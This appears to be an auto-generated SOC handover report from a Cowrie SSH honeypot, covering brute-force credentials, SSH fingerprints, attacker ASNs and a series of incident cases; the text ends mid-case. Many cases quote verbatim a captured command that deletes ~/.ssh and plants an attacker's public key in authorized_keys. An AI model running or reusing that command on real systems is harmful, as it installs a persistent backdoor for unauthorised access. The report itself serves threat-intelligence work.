# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-14 |
| **Generated At** | 2026-06-14T23:12:56Z |
| **Shift Time** | 23:12 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **214** |
| Confirmed Threats | **188** |
| False Positives Filtered | **26** (12.2%) |
| Unique Attacker IPs | **6** |
| Countries of Origin | **5** |
| High Severity Cases | **58** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **156** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **186** |
| Unique Credential Pairs | **148** |
| Unique Usernames | **97** |
| Unique Passwords | **131** |
| Successful Auth Pairs | **41** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 58 |
| `345gs5662d34` | 20 |
| `ubuntu` | 5 |
| `admin` | 4 |
| `user1` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 20 |
| `3245gs5662d34` | 20 |
| `123456` | 12 |
| `1234` | 4 |
| `123` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 20 |
| `root` | `3245gs5662d34` | 20 |
| `master` | `1234` | 1 |
| `song` | `song` | 1 |
| `server` | `123456789` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Admin!` | `153.121.70.198` | 2026-06-14T21:23:05 |
| `root` | `3245gs5662d34` | `153.121.70.198` | 2026-06-14T21:23:09 |
| `root` | `ubuntu18svm` | `153.121.70.198` | 2026-06-14T21:26:47 |
| `root` | `rootutech` | `153.121.70.198` | 2026-06-14T21:34:04 |
| `root` | `ghbdtn` | `153.121.70.198` | 2026-06-14T21:39:28 |
| `root` | `1qaz2WSX3edc` | `153.121.70.198` | 2026-06-14T21:41:24 |
| `root` | `gettherefast` | `153.121.70.198` | 2026-06-14T21:46:51 |
| `root` | `Bg@12345` | `4.227.177.11` | 2026-06-14T21:47:04 |
| `root` | `3245gs5662d34` | `4.227.177.11` | 2026-06-14T21:47:09 |
| `root` | `Ali@2025` | `4.227.177.11` | 2026-06-14T21:48:48 |
| `root` | `abc` | `4.227.177.11` | 2026-06-14T21:56:23 |
| `root` | `zero2hero` | `4.227.177.11` | 2026-06-14T22:02:20 |
| `root` | `Huawei_123` | `4.227.177.11` | 2026-06-14T22:08:17 |
| `root` | `Qaz1234!@#$` | `4.227.177.11` | 2026-06-14T22:22:18 |
| `root` | `loadbalancer` | `4.227.177.11` | 2026-06-14T22:26:28 |
| `root` | `root0000` | `4.227.177.11` | 2026-06-14T22:28:34 |
| `root` | `A1s2d3f4g5` | `4.227.177.11` | 2026-06-14T22:30:30 |
| `root` | `Linux@2025` | `4.227.177.11` | 2026-06-14T22:32:29 |
| `root` | `qwe123!@` | `47.83.133.46` | 2026-06-14T22:37:32 |
| `root` | `abcd@1234` | `47.83.133.46` | 2026-06-14T22:37:39 |
| `root` | `test@123` | `47.83.133.46` | 2026-06-14T22:37:40 |
| `root` | `!qaz@WSX` | `47.83.133.46` | 2026-06-14T22:37:51 |
| `root` | `0` | `47.83.133.46` | 2026-06-14T22:37:52 |
| `root` | `Huawei123` | `47.83.133.46` | 2026-06-14T22:37:52 |
| `root` | `root1234` | `47.83.133.46` | 2026-06-14T22:37:54 |
| `root` | `t0talc0ntr0l4!` | `47.83.133.46` | 2026-06-14T22:37:54 |
| `root` | `Aa123321` | `47.83.133.46` | 2026-06-14T22:38:09 |
| `root` | `111` | `47.83.133.46` | 2026-06-14T22:38:16 |
| `root` | `Pass@123` | `47.83.133.46` | 2026-06-14T22:38:17 |
| `root` | `Password@123` | `47.83.133.46` | 2026-06-14T22:38:18 |
| `root` | `QWEqwe123` | `47.83.133.46` | 2026-06-14T22:38:19 |
| `root` | `test1234` | `47.83.133.46` | 2026-06-14T22:38:20 |
| `root` | `xz123456` | `4.227.177.11` | 2026-06-14T22:38:24 |
| `root` | `0000` | `47.83.133.46` | 2026-06-14T22:38:29 |
| `root` | `Aa@123456` | `47.83.133.46` | 2026-06-14T22:38:38 |
| `root` | `Qwerty` | `47.83.133.46` | 2026-06-14T22:38:39 |
| `root` | `Welcome@123` | `47.83.133.46` | 2026-06-14T22:38:39 |
| `root` | `mima123` | `179.32.33.161` | 2026-06-14T23:04:19 |
| `root` | `3245gs5662d34` | `179.32.33.161` | 2026-06-14T23:04:26 |
| `root` | `Server123123` | `179.32.33.161` | 2026-06-14T23:06:07 |
| `root` | `456654` | `179.32.33.161` | 2026-06-14T23:11:08 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **214** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 97 |
| Go SSH scanner | 91 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 97 | 3 |
| `0a07365cc01f...` | Generic scanner | 90 | 1 |
| `e54ef3ec27fe...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 97 | 3 | Mirai/variant |
| `0a07365cc01f...` | Go SSH scanner | 90 | 1 | Generic scanner |
| `e54ef3ec27fe...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 20 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `179.32.33.161`, `153.121.70.198`, `4.227.177.11`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **6** |
| Unique ASNs | **5** |
| High-Risk ASNs | **4** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 1 | HIGH |
| `AS3816` | COLOMBIA TELECOMUNICACIONES S.A. ESP BIC | 1 | HIGH |
| `AS9541` | Cyber Internet Services (Pvt) Ltd. | 1 | MEDIUM |
| `AS9370` | SAKURA Internet Inc. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (58)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-04b6ab5eed1f

| Field | Detail |
|---|---|
| **Source IP** | `153.121.70[.]198` |
| **First Seen** | 2026-06-14 21:23 |
| **Last Seen** | 2026-06-14 21:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 21:23:05` | `cowrie.session.connect` |
| `2026-06-14 21:23:05` | `cowrie.client.version` |
| `2026-06-14 21:23:05` | `cowrie.client.kex` |
| `2026-06-14 21:23:05` | `cowrie.login.success` |
| `2026-06-14 21:23:06` | `cowrie.session.params` |
| `2026-06-14 21:23:06` | `cowrie.command.input` |
| `2026-06-14 21:23:06` | `cowrie.command.failed` |
| `2026-06-14 21:23:06` | `cowrie.log.closed` |
| `2026-06-14 21:23:06` | `cowrie.session.params` |
| `2026-06-14 21:23:06` | `cowrie.command.input` |
| `2026-06-14 21:23:06` | `cowrie.session.file_download` |
| `2026-06-14 21:23:06` | `cowrie.log.closed` |
| `2026-06-14 21:23:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `153.121.70[.]198` to AbuseIPDB if not already reported
- [ ] Block `153.121.70[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-990c437b59cf

| Field | Detail |
|---|---|
| **Source IP** | `153.121.70[.]198` |
| **First Seen** | 2026-06-14 21:23 |
| **Last Seen** | 2026-06-14 21:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 21:23:08` | `cowrie.session.connect` |
| `2026-06-14 21:23:08` | `cowrie.client.version` |
| `2026-06-14 21:23:09` | `cowrie.client.kex` |
| `2026-06-14 21:23:09` | `cowrie.login.success` |
| `2026-06-14 21:23:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `153.121.70[.]198` to AbuseIPDB if not already reported
- [ ] Block `153.121.70[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94d6548c1907

| Field | Detail |
|---|---|
| **Source IP** | `153.121.70[.]198` |
| **First Seen** | 2026-06-14 21:26 |
| **Last Seen** | 2026-06-14 21:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 21:26:46` | `cowrie.session.connect` |
| `2026-06-14 21:26:46` | `cowrie.client.version` |
| `2026-06-14 21:26:46` | `cowrie.client.kex` |
| `2026-06-14 21:26:47` | `cowrie.login.success` |
| `2026-06-14 21:26:47` | `cowrie.session.params` |
| `2026-06-14 21:26:47` | `cowrie.command.input` |
| `2026-06-14 21:26:47` | `cowrie.command.failed` |
| `2026-06-14 21:26:47` | `cowrie.log.closed` |
| `2026-06-14 21:26:47` | `cowrie.session.params` |
| `2026-06-14 21:26:47` | `cowrie.command.input` |
| `2026-06-14 21:26:48` | `cowrie.session.file_download` |
| `2026-06-14 21:26:48` | `cowrie.log.closed` |
| `2026-06-14 21:26:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `153.121.70[.]198` to AbuseIPDB if not already reported
- [ ] Block `153.121.70[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-739262b2fdaa

| Field | Detail |
|---|---|
| **Source IP** | `153.121.70[.]198` |
| **First Seen** | 2026-06-14 21:26 |
| **Last Seen** | 2026-06-14 21:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 21:26:50` | `cowrie.session.connect` |
| `2026-06-14 21:26:50` | `cowrie.client.version` |
| `2026-06-14 21:26:50` | `cowrie.client.kex` |
| `2026-06-14 21:26:50` | `cowrie.login.success` |
| `2026-06-14 21:26:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `153.121.70[.]198` to AbuseIPDB if not already reported
- [ ] Block `153.121.70[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5ce967b05fb

| Field | Detail |
|---|---|
| **Source IP** | `153.121.70[.]198` |
| **First Seen** | 2026-06-14 21:34 |
| **Last Seen** | 2026-06-14 21:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 21:34:04` | `cowrie.session.connect` |
| `2026-06-14 21:34:04` | `cowrie.client.version` |
| `2026-06-14 21:34:04` | `cowrie.client.kex` |
| `2026-06-14 21:34:04` | `cowrie.login.success` |
| `2026-06-14 21:34:05` | `cowrie.session.params` |
| `2026-06-14 21:34:05` | `cowrie.command.input` |
| `2026-06-14 21:34:05` | `cowrie.command.failed` |
| `2026-06-14 21:34:05` | `cowrie.log.closed` |
| `2026-06-14 21:34:05` | `cowrie.session.params` |
| `2026-06-14 21:34:05` | `cowrie.command.input` |
| `2026-06-14 21:34:05` | `cowrie.session.file_download` |
| `2026-06-14 21:34:05` | `cowrie.log.closed` |
| `2026-06-14 21:34:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `153.121.70[.]198` to AbuseIPDB if not already reported
- [ ] Block `153.121.70[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf608859ab99

| Field | Detail |
|---|---|
| **Source IP** | `153.121.70[.]198` |
| **First Seen** | 2026-06-14 21:34 |
| **Last Seen** | 2026-06-14 21:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 21:34:07` | `cowrie.session.connect` |
| `2026-06-14 21:34:07` | `cowrie.client.version` |
| `2026-06-14 21:34:07` | `cowrie.client.kex` |
| `2026-06-14 21:34:08` | `cowrie.login.success` |
| `2026-06-14 21:34:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `153.121.70[.]198` to AbuseIPDB if not already reported
- [ ] Block `153.121.70[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-801481428390

| Field | Detail |
|---|---|
| **Source IP** | `153.121.70[.]198` |
| **First Seen** | 2026-06-14 21:39 |
| **Last Seen** | 2026-06-14 21:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 21:39:28` | `cowrie.session.connect` |
| `2026-06-14 21:39:28` | `cowrie.client.version` |
| `2026-06-14 21:39:28` | `cowrie.client.kex` |
| `2026-06-14 21:39:28` | `cowrie.login.success` |
| `2026-06-14 21:39:29` | `cowrie.session.params` |
| `2026-06-14 21:39:29` | `cowrie.command.input` |
| `2026-06-14 21:39:29` | `cowrie.command.failed` |
| `2026-06-14 21:39:29` | `cowrie.log.closed` |
| `2026-06-14 21:39:29` | `cowrie.session.params` |
| `2026-06-14 21:39:29` | `cowrie.command.input` |
| `2026-06-14 21:39:29` | `cowrie.session.file_download` |
| `2026-06-14 21:39:29` | `cowrie.log.closed` |
| `2026-06-14 21:39:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `153.121.70[.]198` to AbuseIPDB if not already reported
- [ ] Block `153.121.70[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0d1c5abeea4

| Field | Detail |
|---|---|
| **Source IP** | `153.121.70[.]198` |
| **First Seen** | 2026-06-14 21:39 |
| **Last Seen** | 2026-06-14 21:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 21:39:31` | `cowrie.session.connect` |
| `2026-06-14 21:39:31` | `cowrie.client.version` |
| `2026-06-14 21:39:31` | `cowrie.client.kex` |
| `2026-06-14 21:39:32` | `cowrie.login.success` |
| `2026-06-14 21:39:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `153.121.70[.]198` to AbuseIPDB if not already reported
- [ ] Block `153.121.70[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f335d1de386

| Field | Detail |
|---|---|
| **Source IP** | `153.121.70[.]198` |
| **First Seen** | 2026-06-14 21:41 |
| **Last Seen** | 2026-06-14 21:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 21:41:23` | `cowrie.session.connect` |
| `2026-06-14 21:41:23` | `cowrie.client.version` |
| `2026-06-14 21:41:23` | `cowrie.client.kex` |
| `2026-06-14 21:41:24` | `cowrie.login.success` |
| `2026-06-14 21:41:24` | `cowrie.session.params` |
| `2026-06-14 21:41:24` | `cowrie.command.input` |
| `2026-06-14 21:41:24` | `cowrie.command.failed` |
| `2026-06-14 21:41:24` | `cowrie.log.closed` |
| `2026-06-14 21:41:24` | `cowrie.session.params` |
| `2026-06-14 21:41:24` | `cowrie.command.input` |
| `2026-06-14 21:41:25` | `cowrie.session.file_download` |
| `2026-06-14 21:41:25` | `cowrie.log.closed` |
| `2026-06-14 21:41:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `153.121.70[.]198` to AbuseIPDB if not already reported
- [ ] Block `153.121.70[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7aa084593081

| Field | Detail |
|---|---|
| **Source IP** | `153.121.70[.]198` |
| **First Seen** | 2026-06-14 21:41 |
| **Last Seen** | 2026-06-14 21:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 21:41:27` | `cowrie.session.connect` |
| `2026-06-14 21:41:27` | `cowrie.client.version` |
| `2026-06-14 21:41:27` | `cowrie.client.kex` |
| `2026-06-14 21:41:27` | `cowrie.login.success` |
| `2026-06-14 21:41:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `153.121.70[.]198` to AbuseIPDB if not already reported
- [ ] Block `153.121.70[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6cfc8f8a68c5

| Field | Detail |
|---|---|
| **Source IP** | `153.121.70[.]198` |
| **First Seen** | 2026-06-14 21:46 |
| **Last Seen** | 2026-06-14 21:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 21:46:50` | `cowrie.session.connect` |
| `2026-06-14 21:46:50` | `cowrie.client.version` |
| `2026-06-14 21:46:50` | `cowrie.client.kex` |
| `2026-06-14 21:46:51` | `cowrie.login.success` |
| `2026-06-14 21:46:51` | `cowrie.session.params` |
| `2026-06-14 21:46:51` | `cowrie.command.input` |
| `2026-06-14 21:46:51` | `cowrie.command.failed` |
| `2026-06-14 21:46:51` | `cowrie.log.closed` |
| `2026-06-14 21:46:51` | `cowrie.session.params` |
| `2026-06-14 21:46:51` | `cowrie.command.input` |
| `2026-06-14 21:46:52` | `cowrie.session.file_download` |
| `2026-06-14 21:46:52` | `cowrie.log.closed` |
| `2026-06-14 21:46:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `153.121.70[.]198` to AbuseIPDB if not already reported
- [ ] Block `153.121.70[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5129a441d584

| Field | Detail |
|---|---|
| **Source IP** | `153.121.70[.]198` |
| **First Seen** | 2026-06-14 21:46 |
| **Last Seen** | 2026-06-14 21:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 21:46:54` | `cowrie.session.connect` |
| `2026-06-14 21:46:54` | `cowrie.client.version` |
| `2026-06-14 21:46:54` | `cowrie.client.kex` |
| `2026-06-14 21:46:54` | `cowrie.login.success` |
| `2026-06-14 21:46:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `153.121.70[.]198` to AbuseIPDB if not already reported
- [ ] Block `153.121.70[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60e27fdfefdb

| Field | Detail |
|---|---|
| **Source IP** | `4.227.177[.]11` |
| **First Seen** | 2026-06-14 21:47 |
| **Last Seen** | 2026-06-14 21:47 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
